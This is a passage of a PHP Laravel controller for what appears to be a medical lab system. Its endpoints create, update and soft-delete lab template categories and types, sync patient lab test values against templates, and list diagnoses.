        $id = DB::table('template_categories')->insertGetId(['name' => $name, 'description' => $desc, 'created_at' => $currentdatetime]);

        return response()->json(['status' => true, 'data' => 'Category Created.', 'data' => $id]);
    }

    public function update_lab_template_category(Request $request)
    {
        $cat_id = $request->input('cat_id');
        $desc = $request->input('description');
        $name = $request->input('category_name');
        $currentdatetime = date('Y-m-d H:i:s');
        DB::table('template_categories')
            ->where('id', $cat_id)
            ->update(['name' => $name, 'description' => $desc, 'updated_at' => $currentdatetime]);

        return response()->json(['status' => true, 'data' => 'Category Updated.']);
    }

    public function delete_lab_template_category(Request $request)
    {
        $cat_id = $request->input('cat_id');

        DB::table('template_categories')
            ->where('id', $cat_id)
            ->update(['status' => 0]);

        return response()->json(['status' => true, 'data' => 'Category Deleted.']);
    }

    // LAB Template Types
    public function get_lab_template_types()
    {
        $types = DB::table('template_types')->where('status', 1)->get();

        return response()->json(['status' => true, 'data' => $types]);

    }

    public function get_lab_template_type(Request $request)
    {
        $id = $request->input('type_id');
        $types = DB::table('template_types')->where('id', $id)->where('status', 1)->get();
        return response()->json(['status' => true, 'data' => $types]);

    }

    public function add_lab_template_types(Request $request)
    {
        $name = $request->input('type_name');
        $desc = $request->input('description');
        $currentdatetime = date('Y-m-d H:i:s');
        $id = DB::table('template_types')->insertGetId(['name' => $name, 'description' => $desc, 'created_at' => $currentdatetime]);
        return response()->json(['status' => true, 'data' => 'Type Created.', 'id' => $id]);

    }

    public function update_lab_template_types(Request $request)
    {
        $type_id = $request->input('type_id');
        $name = $request->input('type_name');
        $desc = $request->input('description');
        $currentdatetime = date('Y-m-d H:i:s');
        DB::table('template_types')->where('id', $type_id)->update(['name' => $name, 'description' => $desc, 'updated_at' => $currentdatetime]);
        return response()->json(['status' => true, 'data' => 'Type Updated.']);
    }

    public function delete_lab_template_types(Request $request)
    {
        $type_id = $request->input('type_id');

        DB::table('template_types')
            ->where('id', $type_id)
            ->update(['status' => 0]);

        return response()->json(['status' => true, 'data' => 'Type Deleted.']);
    }


    public function get_template_details(Request $request)
    {
        $template_id = $request->input('template_id');

        $details = DB::table('templates')
            ->select(DB::raw('*'))
            ->where('templates.id', $template_id)
            ->where('status', 1)
            ->first();

        return response()->json(['status' => true, 'data' => $details]);

    }

    public function check_lab_orders_status(Request $request)
      {
          $lab_order_test_id =  $request->input('lab_order_test_id');

          $status = DB::table('patient_lab_test_values')
              ->select(DB::raw('id,signoff,template_values,template_id'))
              ->where('lab_test', $lab_order_test_id)
              ->first();

          if(empty($status)){
              $signoff = 0;
              return response()->json(['status' => true, 'signoff' => $signoff,'data'=>array()]);
          }
          $signoff = $status->signoff;

          $data = DB::table('patient_lab_test_values')
              ->leftJoin('templates', 'templates.id', '=', 'patient_lab_test_values.template_id')
              ->select('patient_lab_test_values.template_values', 'templates.template','templates.name','patient_lab_test_values.template_id','templates.category_id')
              ->where('patient_lab_test_values.id', $status->id)->first();


          $template_values = json_decode($data->template_values);
          $template = json_decode($data->template);

          $arr = array();

          if (empty((array)$template_values)) {

              foreach ($template->fields as $temp) {
                  $arr[$temp->name] = '';
              }

              $template_values = json_encode($arr);

              DB::table('patient_lab_test_values')
                  ->where('id', $status->id)
                  ->update(['template_values' => $template_values, 'updated_at' => date("Y-m-d  H:i:s")]);

          } else {

              foreach ($template->fields as $temp) {

                  foreach ($template_values as $k => $v) {

                      if (ltrim(rtrim($temp->name)) == ltrim(rtrim($k))) {
                          $arr[$temp->name] = "$v";
                          break;
                      } else {
                          $arr[$temp->name] = '';
                          //echo 'WAITING HERE';
                          //break;
                      }
                  }

              }

              $template_values = json_encode($arr);

              DB::table('patient_lab_test_values')
                     ->where('id', $status->id)
                     ->update(['template_values' => $template_values, 'updated_at' => date("Y-m-d  H:i:s")]);
          }


          $lab_orders_new_data = DB::table('patient_lab_test_values')
              ->select('template_values')
              ->where('id', $status->id)->first();


          return response()->json(['status' => true, 'signoff' => $signoff,'data'=>$lab_orders_new_data->template_values,'template'=>$data->template,'template_name'=>$data->name,'template_id'=>$data->template_id, 'category_id' => $data->category_id,'doctor'=> 'DR James','test_by'=>'alex','date_of_service'=>'10th May']);
      }

    public function get_diagnosis(Request $request){

        $diagnosis = DB::table('diagnosis')
            ->select(DB::raw('id,name,code'))
            ->get();

        return response()->json(['status' => true, 'data' => $diagnosis]);

    }

}


